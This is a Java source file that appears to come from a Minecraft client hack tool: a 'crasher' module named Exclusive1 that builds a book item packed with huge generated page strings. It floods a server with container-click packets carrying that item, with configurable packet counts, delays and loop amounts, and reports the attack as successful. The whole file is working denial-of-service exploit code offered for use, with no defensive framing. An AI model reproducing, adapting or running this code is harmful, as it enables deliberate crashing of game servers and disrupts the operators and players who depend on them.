package us.whitedev.crashers.impl;

import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Optional;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import net.minecraft.core.NonNullList;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.nbt.StringTag;
import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
import net.minecraft.world.inventory.AbstractContainerMenu;
import net.minecraft.world.inventory.ClickType;
import net.minecraft.world.inventory.Slot;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import us.whitedev.crashers.Crasher;
import us.whitedev.helpers.PacketHelper;
import us.whitedev.utils.OptionType;
import us.whitedev.utils.OptionUtil;

public class Exclusive1 implements Crasher {
    private static final String METHOD_NAME = "Exclusive1";
    private boolean enabled = false;
    private ScheduledExecutorService executorService;

    public Exclusive1() {
    }

    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[2]);
        int chars = Integer.parseInt(args[3]);
        int pages = Integer.parseInt(args[4]);
        boolean emptyStack = args[5].equals("true");
        String genType = args[6].toLowerCase(Locale.ROOT);
        String bookType = args[7].toLowerCase(Locale.ROOT);
        long threadSleep = Long.parseLong(args[8]);
        int loopAmount = Integer.parseInt(args[9]);
        this.setEnabled(true);
        if (this.executorService != null && !this.executorService.isShutdown()) {
            this.executorService.shutdownNow();
            msgHelper.sendMessage("Previous attack &cstopped&7!", true);
        }

        msgHelper.sendMessage("Starting crashing with &f" + this.getName(), true);
        StringBuilder s = new StringBuilder();
        s.append(bypassHelper.generateString(chars, genType));
        CompoundTag comp = new CompoundTag();
        ListTag list = new ListTag();

        for(int i = 0; i < pages; ++i) {
            list.add(new StringTag(s.toString()));
        }

        comp.putString("author", "0whitedev");
        comp.putString("title", "madeq");
        comp.putByte("resolved", (byte)1);
        comp.put("pages", list);
        ItemStack itemstack = new ItemStack(bookType.equals("normal") ? Items.WRITABLE_BOOK : Items.WRITTEN_BOOK, 1, Optional.of(comp));
        Int2ObjectMap<ItemStack> int2objectmap = new Int2ObjectOpenHashMap();
        AbstractContainerMenu abstractcontainermenu = mc.player != null ? mc.player.containerMenu : null;
        NonNullList<Slot> nonnulllist = abstractcontainermenu != null ? abstractcontainermenu.slots : null;

        for(int j = 0; j < 46; ++j) {
            ItemStack itemstack1 = ((Slot)nonnulllist.get(j)).getItem();
            if (!ItemStack.matches(itemstack, itemstack1)) {
                int2objectmap.put(j, itemstack1.copy());
            }
        }

        AtomicInteger check = new AtomicInteger(0);
        this.executorService = Executors.newSingleThreadScheduledExecutor();
        Runnable clickTask = () -> {
            for(int i = 0; i < packets; ++i) {
                if (!this.enabled || check.get() == loopAmount) {
                    this.executorService.shutdown();
                    this.setEnabled(false);
                    msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
                    break;
                }

                PacketHelper.send(new ServerboundContainerClickPacket(0, 0, 20, 0, ClickType.PICKUP_ALL, emptyStack ? ItemStack.EMPTY : itemstack, int2objectmap));
            }

            check.getAndIncrement();
        };
        this.executorService.scheduleAtFixedRate(clickTask, 0L, threadSleep, TimeUnit.MILLISECONDS);
    }

    public String getName() {
        return "Exclusive1";
    }

    public boolean getEnabled() {
        return this.enabled;
    }

    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }

    public List<OptionUtil> getOptions() {
        return List.of(new OptionUtil("Packets", OptionType.INTEGER), new OptionUtil("Chars", OptionType.INTEGER), new OptionUtil("Pages", OptionType.INTEGER), new OptionUtil("Empty Stack", OptionType.BOOLEAN), new OptionUtil("Generator", OptionType.LIST, new String[]{"Default", "Boost1", "Boost2", "Modern1", "Modern2", "Hard"}), new OptionUtil("Item", OptionType.LIST, new String[]{"Normal", "Saved"}), new OptionUtil("Thread Sleep", OptionType.INTEGER), new OptionUtil("Loop Amount", OptionType.INTEGER));
    }

    public String getArgsUsage() {
        return "packets[100], chars[100], pages[10], empty-stack[false], generator[modern], item[saved], thread-sleep[1500(milliseconds)], loop-amount[10]";
    }

    public String getDescription() {
        return "WClick Crasher [book]";
    }
}
